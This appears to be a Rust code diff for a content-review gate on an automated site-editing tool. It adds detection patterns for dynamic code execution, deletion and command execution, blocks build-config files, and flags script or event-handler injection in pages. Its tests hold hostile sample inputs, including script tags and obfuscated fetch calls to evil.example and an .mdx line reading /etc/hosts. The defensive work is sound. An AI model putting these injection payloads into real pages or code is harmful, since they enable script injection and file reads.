@@ -194,7 +194,8 @@ pub fn block_kind_label(k: &str) -> &'static str {
     }
 }
 /// 「放开」档默认就不拦的类型
-const OPEN_LETS: &[&str] = &["html", "env", "package", "orphan", "jev"];
+// env 不在里面：读环境变量的代码可能把密钥渲染进公开页面，验收测不出来、回滚也收不回，任何等级都要人看
+const OPEN_LETS: &[&str] = &["html", "package", "orphan", "jev"];
 
 /// 一条不能自动上线的原因；kind 是 `BLOCK_KINDS` 里的一种，空＝不能放行。
 #[derive(Clone, Debug, PartialEq)]
@@ -342,6 +343,13 @@ impl ManagedGroup {
         self.allow_kinds.retain(|k| BLOCK_KINDS.contains(&k.as_str()));
         self.allow_kinds.sort();
         self.allow_kinds.dedup();
+    }
+    /// 等级收紧时（放开 → 标准 → 稳妥）清掉「这类以后不拦」的放行：那是在更宽的等级下点的，换成更严的等级就该重新把关
+    pub fn tighten_from(&mut self, previous: &str) {
+        let rank = |t: &str| TIERS.iter().position(|x| *x == t).unwrap_or(1);
+        if rank(&self.strictness) < rank(previous) {
+            self.allow_kinds.clear();
+        }
     }
     pub fn allows(&self, change: &str) -> bool {
         // 计划里偶尔出现的细分类型（title / meta_description）都算「改标题和描述」
@@ -674,6 +682,9 @@ pub fn hard_forbidden(path: &str) -> bool {
         || name.starts_with("next.config")
         || name.starts_with("svelte.config")
         || name.starts_with("tailwind.config")
+        // 其它框架的构建入口和配置、托管平台的重定向配置：构建时在本机执行，或直接改线上路由
+        || ["nuxt.config", "gatsby-", "remix.config", "rollup.config", "webpack.config", "postcss.config", "babel.config", "eleventy.config", ".eleventy", "build.", "prebuild.", "postbuild."].iter().any(|p| name.starts_with(p))
+        || matches!(name, "vercel.json" | "netlify.toml" | "firebase.json" | "now.json")
         || matches!(first, ".github" | "worker" | "workers" | "functions" | "server" | "scripts" | "node_modules" | "cmd" | "internal" | "deploy" | "bin" | "migrations")
         || segs.iter().any(|s| matches!(*s, "api" | "server" | "functions" | "middleware"))
         || matches!(name, "go.mod" | "go.sum" | "Makefile" | "Dockerfile")
@@ -785,6 +796,14 @@ pub fn risky_code(line: &str) -> Option<&'static str> {
         ("urllib.request", "请求外部服务"),
         ("urlopen(", "请求外部服务"),
         ("os.Remove", "删除文件"),
+        ("import(", "动态加载代码"),
+        ("__import__", "动态执行代码"),
+        ("globalThis[", "动态执行代码"),
+        ("process[", "动态执行代码"),
+        ("Reflect.", "动态执行代码"),
+        ("os.system(", "执行命令"),
+        ("os.popen(", "执行命令"),
+        ("shutil.rmtree", "删除文件"),
     ] {
         if t.contains(pat) {
             return Some(why);
@@ -805,10 +824,35 @@ pub fn risky_code(line: &str) -> Option<&'static str> {
     None
 }
 
+/// 页面文件（Markdown / HTML / SVG）里不该自动上线的写法：Markdown 允许内嵌 HTML，Astro 原样渲染，`public/` 下的 HTML / SVG 直接上线。
+/// 脚本、事件处理、javascript: 任何等级都要人看；iframe / object / embed 按「直接插入 HTML」算（方案可以放行）。
+fn page_risky(line: &str) -> Option<&'static str> {
+    let l = line.to_ascii_lowercase();
+    if l.contains("<script") || l.contains("javascript:") {
+        return Some("插入脚本");
+    }
+    // 标签属性里的事件处理：onclick= / onload= / onerror=（前面是空格或引号，后面紧跟 =）
+    let mut from = 0;
+    while let Some(i) = l[from..].find("on") {
+        let i = from + i;
+        let before_ok = i == 0 || matches!(l.as_bytes()[i - 1], b' ' | b'"' | b'\'' | b'<');
+        let rest = &l[i + 2..];
+        let name_len = rest.chars().take_while(|c| c.is_ascii_alphabetic()).count();
+        if before_ok && name_len >= 3 && rest[name_len..].trim_start().starts_with('=') {
+            return Some("插入脚本");
+        }
+        from = i + 2;
+    }
+    if l.contains("<iframe") || l.contains("<object") || l.contains("<embed") {
+        return Some("嵌入外部页面");
+    }
+    None
+}
+
 /// 危险写法对应的拦截类型：直接插入 HTML、读环境变量、引入外部包可以按方案放行；调外部服务、执行命令这些不行。
 fn risky_kind(why: &str) -> &'static str {
     match why {
-        "直接插入 HTML" => "html",
+        "直接插入 HTML" | "嵌入外部页面" => "html",
         "读环境变量" | "读运行环境（密钥、数据库）" => "env",
         "引入了外部包" => "package",
         _ => "",
@@ -908,6 +952,11 @@ fn generated_by_build(file: &str, generated: &[String]) -> bool {
     !hard_forbidden(file) && generated.iter().any(|g| g == name)
 }
 
+/// 这次改动里新建的页面文件（给「允许的动作」核对：方案没允许写新页面却新建了页面就拦）
+pub fn new_page_files(diff: &str) -> Vec<String> {
+    split_diff(diff).into_iter().filter(|f| f.new_file && is_page_file(&f.file)).map(|f| f.file).collect()
+}
+
 /// 推荐相关的英文词（链接、字段名里出现）
 const MONEY_WORDS: &[&str] = &["referral", "invite", "affiliate", "promo", "coupon", "rebate", "refcode", "ref_code", "kickback"];
 
@@ -960,7 +1009,7 @@ pub fn touches_money(line: &str) -> bool {
 
 /// 改动里新加的推荐内容（链接、码、字段）：上线前查一下改动前的站点里有没有，已有的（比如换个位置再引用 refCode）不算新增。
 pub fn added_money_atoms(diff: &str) -> Vec<String> {
-    let mut v: Vec<String> = split_diff(diff).iter().filter(|f| !f.new_file).flat_map(|f| f.added.iter().flat_map(|a| money_atoms(a))).collect();
+    let mut v: Vec<String> = split_diff(diff).iter().flat_map(|f| f.added.iter().flat_map(|a| money_atoms(a))).collect();
     v.sort();
     v.dedup();
     v
@@ -1214,8 +1263,16 @@ fn regex_value(t: &str) -> bool {
 /// 这一行是不是纯数据：对象键、字符串、数字、括号逗号；或者从本地文件导入 / 导出一个数据常量、展开一个数组。
 fn data_line(line: &str) -> bool {
     let t = line.trim();
-    if t.is_empty() || t.starts_with("//") || t.starts_with("/*") || t.starts_with('*') {
+    if t.is_empty() || t.starts_with("//") {
         return true;
+    }
+    // `* …` 多半是块注释里的一行，但 `* globalThis[...]()` 也是合法的乘法表达式（和上一行的数字接上）：
+    // 带调用、下标、赋值、模板串的不算注释；`/* … */ 代码` 这种注释后面还有东西的也不算
+    if t.starts_with('*') {
+        return !t.contains(['(', '[', '=', '`']);
+    }
+    if let Some(rest) = t.strip_prefix("/*") {
+        return rest.split_once("*/").is_none_or(|(_, after)| after.trim().is_empty());
     }
     if regex_value(t) {
         return true;
@@ -1226,7 +1283,9 @@ fn data_line(line: &str) -> bool {
     if let Some(rest) = code.strip_prefix("import ") {
         let from_local = t.contains("from './") || t.contains("from \"./");
         let names = rest.trim_start_matches("type ").trim();
-        return from_local && names.starts_with('{') && names.split('}').next().is_some_and(|n| n.chars().all(|c| c.is_alphanumeric() || "_$, {".contains(c)));
+        // 同一行不能再跟别的语句（`import {a} from './x'; eval(...)`）
+        let body = code.trim_end_matches(';').trim();
+        return from_local && !body.contains(';') && !body.contains('(') && names.starts_with('{') && names.split('}').next().is_some_and(|n| n.chars().all(|c| c.is_alphanumeric() || "_$, {".contains(c)));
     }
     // export const xxx: Type[] = [ / const xxx = {（模块内的数据常量）
     if let Some(rest) = code.strip_prefix("export const ").or_else(|| code.strip_prefix("const ")) {
@@ -1283,8 +1342,10 @@ pub fn verdict(diff: &str, rules: &Rules) -> Vec<Block> {
         // 站点代码：数据文件里混了代码，或模板 / 组件 / 样式 / 前端脚本。
         // 服务端代码（Go 站把页面和标题写在 internal/*.go 里这类）：放进站点清单的照代码设置判断；
         // 「代码改动：全部」时不用放清单，构建、检查、上线后验收兜底（Worker / Functions / API 路由除外）
+        // 构建 / 检查 / 部署会跑到的脚本（不管放在哪个目录）：构建时在本机执行，任何等级都不自动改
+        let in_build_chain = rules.build_scripts.is_some_and(|b| b.iter().any(|s| file.rsplit('/').next() == Some(s.as_str())));
         let allowed = hard_forbidden(file) && !never_allow(file) && (listed(file, rules.content_code) || (code == "all" && !edge_runtime(file)));
-        let forbidden = hard_forbidden(file) && !allowed;
+        let forbidden = (hard_forbidden(file) && !allowed) || in_build_chain;
         let is_code = !data && !forbidden && (allowed || data_file(file) || site_code_file(file) || test_file(file.rsplit('/').next().unwrap_or(file)));
         if forbidden {
             reasons.push(block("", format!("{file}：依赖、构建 / 部署配置、服务端代码不自动改")));
@@ -1297,6 +1358,31 @@ pub fn verdict(diff: &str, rules: &Rules) -> Vec<Block> {
             }
         } else if !data && !content_ext.iter().any(|e| file.ends_with(&format!(".{e}"))) {
             reasons.push(block("", format!("{file}：不是页面内容文件")));
+        }
+        // 页面文件里内嵌的脚本 / 事件 / iframe；.mdx 的 import / export 行是构建期执行的代码，按代码查
+        if is_page_file(file) || file.ends_with(".svg") {
+            let mut seen: Vec<&str> = Vec::new();
+            for l in &f.added {
+                let t = l.trim_start();
+                let why = page_risky(l).or_else(|| if file.ends_with(".mdx") && (t.starts_with("import ") || t.starts_with("export ")) { risky_code(l) } else { None });
+                let Some(why) = why else { continue };
+                let kind = risky_kind(why);
+                if seen.contains(&why) || rules.lets(kind) {
+                    continue;
+                }
+                seen.push(why);
+                reasons.push(block(kind, format!("{file}：页面里{why}（「{}」），留给你确认", l.trim().chars().take(60).collect::<String>())));
+            }
+            // 改网址、下架：slug / permalink / draft 这些键一变，旧网址就 404（没有跳转）或页面消失，要人判断
+            for r in &f.removed {
+                let t = r.trim();
+                if let Some(key) = t.split_once(':').map(|(k, _)| k.trim().trim_matches(['"', '\''])) {
+                    if matches!(key, "slug" | "permalink" | "url" | "draft" | "published" | "noindex" | "redirect_from" | "aliases") && !t.starts_with('-') && !t.starts_with('#') {
+                        reasons.push(block("", format!("{file}：改了 {key}（网址或发布状态），旧网址会失效或页面会消失，留给你确认")));
+                        break;
+                    }
+                }
+            }
         }
         if is_code || template_file(file) {
             // 每种危险写法报一条；方案放行的类型跳过
@@ -1329,13 +1415,15 @@ pub fn verdict(diff: &str, rules: &Rules) -> Vec<Block> {
             changed += f.added.len() + f.removed.len();
         }
         money_out.extend(f.removed.iter().filter(|r| touches_money(r)).map(|r| (file.clone(), r.clone())));
-        if !f.new_file {
-            money_in.extend(f.added.iter().filter(|a| touches_money(a)).map(|a| (file.clone(), a.clone())));
-        }
-        let page = is_page_file(file) || data;
+        // 新文件里的推荐内容也要查（新文章最容易把别人的推荐码带出来）：站点本来就有的链接 / 码（known）不算
+        let fresh = |a: &String| touches_money(a) && (!f.new_file || money_atoms(a).iter().any(|at| !rules.known.contains(at)));
+        money_in.extend(f.added.iter().filter(|a| fresh(a)).map(|a| (file.clone(), a.clone())));
+        // .json 数据文件：不是页面也不算 data 文件，但字符串里的内部用语一样会上线
+        let jsonish = file.ends_with(".json") && !data;
+        let page = is_page_file(file) || data || jsonish;
         if page {
             // 页面文件看整行；数据文件只看字符串里的文字
-            let texts: Vec<String> = f.added.iter().map(|a| if data { split_strings(a).map(|x| x.1).unwrap_or_default() } else { a.clone() }).collect();
+            let texts: Vec<String> = f.added.iter().map(|a| if data || jsonish { split_strings(a).map(|x| x.1).unwrap_or_default() } else { a.clone() }).collect();
             if !rules.lets("leak") {
                 for t in &texts {
                     if let Some(m) = leak_marker(t) {
@@ -1741,6 +1829,66 @@ mod tests {
         assert_eq!(frontmatter_prose("    shot: bn-hans-deposit-network.webp"), "");
         assert_eq!(frontmatter_prose("published: \"2026-11-01\""), "");
         assert_eq!(frontmatter_prose("  - q: 收款给 UID 和给地址哪个好？"), "收款给 UID 和给地址哪个好？");
+    }
+
+    #[test]
+    fn new_files_are_checked_for_foreign_referrals() {
+        let known: &'static [String] = Box::leak(vec!["/go/binance".to_string()].into_boxed_slice());
+        let rules = |k: &'static [String]| Rules { tier: "standard", code: "all", allow: &[], new_content: true, min_page: 0, content_code: &[], known: k, generated: &[], build_scripts: None };
+        let new = |body: &str| format!("diff --git a/src/content/new.md b/src/content/new.md\nnew file mode 100644\n--- /dev/null\n+++ b/src/content/new.md\n@@ -0,0 +1 @@\n+{body}\n");
+        let kinds = |v: Vec<Block>| v.into_iter().map(|b| b.kind).collect::<Vec<_>>();
+        // 新文章里带了别人的推荐链接：拦；用站点本来就有的（known）：不拦
+        assert_eq!(kinds(verdict(&new("去 [这里注册](https://www.okx.com/join?ref=STRANGER) 拿返佣"), &rules(&[]))), vec!["money"]);
+        assert!(kinds(verdict(&new("去 [币安注册](/go/binance) 拿返佣"), &rules(known))).is_empty());
+        assert!(added_money_atoms(&new("邀请码 ABCD1234 填这里")).iter().any(|a| a.contains("ABCD1234")), "新文件的推荐原子也要进 known 的计算");
+    }
+
+    #[test]
+    fn scripts_in_pages_and_data_files_do_not_ship() {
+        let d = |file: &str, plus: &[&str]| {
+            let body: String = plus.iter().map(|l| format!("+{l}\n")).collect();
+            format!("diff --git a/{file} b/{file}\n--- a/{file}\n+++ b/{file}\n@@ -1 +1 @@\n-x\n{body}")
+        };
+        let v = |diff: &str| managed_verdict(diff, true, 0, "all", &[]);
+        // Markdown / HTML / SVG 里内嵌脚本、事件、javascript:：任何等级都拦
+        assert!(v(&d("src/content/a.md", &["<script src=\"https://evil.example/x.js\"></script>"])).iter().any(|r| r.contains("插入脚本")), "{:?}", v(&d("src/content/a.md", &["<script>"])));
+        assert!(v(&d("public/promo.html", &["<img src=x onerror=\"fetch('https://e')\">"])).iter().any(|r| r.contains("插入脚本")));
+        assert!(v(&d("public/logo.svg", &["<a href=\"javascript:alert(1)\">"])).iter().any(|r| r.contains("插入脚本")));
+        // iframe 按「直接插入 HTML」（html 类，方案可以放行）
+        assert_eq!(verdict(&d("src/content/a.md", &["<iframe src=\"https://www.youtube.com/embed/x\"></iframe>"]), &Rules { tier: "open", code: "all", allow: &[], new_content: true, min_page: 0, content_code: &[], known: &[], generated: &[], build_scripts: None }).len(), 0);
+        // .mdx 的 import / export 是构建期代码
+        assert!(v(&d("src/content/a.mdx", &["export const d = await (await import('node:' + 'fs')).promises.readFile('/etc/hosts')"])).iter().any(|r| r.contains("动态加载代码")));
+        // 正文里提到 onclick 这个词不算（不是标签属性）
+        assert!(!v(&d("src/content/a.md", &["按钮的 onclick 事件是前端常见写法。"])).iter().any(|r| r.contains("插入脚本")));
+        // 数据文件：`*` 开头的「乘法行」、注释后面接代码、import 后面接语句都不是纯数据
+        assert!(!data_line("* globalThis['fet'+'ch']('https://evil.example')"));
+        assert!(data_line("* 这一行是块注释里的说明"));
+        assert!(!data_line("/* x */ eval('1')"));
+        assert!(data_line("/* 只是注释 */"));
+        assert!(!data_line("import { a } from './x'; globalThis['eval']('1')"));
+        assert!(data_line("import { a, b } from './x';"));
+        // 改 slug / draft：旧网址失效或页面消失
+        let slug = format!("diff --git a/src/content/a.md b/src/content/a.md\n--- a/src/content/a.md\n+++ b/src/content/a.md\n@@ -1 +1 @@\n-slug: okx-fees\n+slug: okx-fee-guide\n");
+        assert!(v(&slug).iter().any(|r| r.contains("改了 slug")));
+        // .json 数据文件里的内部用语
+        let j = format!("diff --git a/src/data/faq.json b/src/data/faq.json\n--- a/src/data/faq.json\n+++ b/src/data/faq.json\n@@ -1 +1 @@\n-x\n+  \"answer\": \"TODO 待补充具体步骤\"\n");
+        assert!(v(&j).iter().any(|r| r.contains("内部说明")));
+        // 构建链里的脚本不管在哪个目录都拦；env 在放开档也不放行
+        let b: &'static [String] = Box::leak(vec!["build.mjs".to_string()].into_boxed_slice());
+        let r = Rules { tier: "open", code: "all", allow: &[], new_content: true, min_page: 0, content_code: &[], known: &[], generated: &[], build_scripts: Some(b) };
+        assert!(verdict(&d("tools/build.mjs", &["const x = 1"]), &r).iter().any(|b| b.text.contains("不自动改")));
+        assert!(!r.lets("env"));
+        // 等级收紧时清掉放行
+        let mut g = ManagedGroup::from_legacy(&Default::default(), "t");
+        g.strictness = "strict".into();
+        g.allow_kinds = vec!["money".into()];
+        g.tighten_from("open");
+        assert!(g.allow_kinds.is_empty());
+        let mut g2 = ManagedGroup::from_legacy(&Default::default(), "t");
+        g2.strictness = "open".into();
+        g2.allow_kinds = vec!["money".into()];
+        g2.tighten_from("standard");
+        assert_eq!(g2.allow_kinds, vec!["money"]);
     }
 
     #[test]
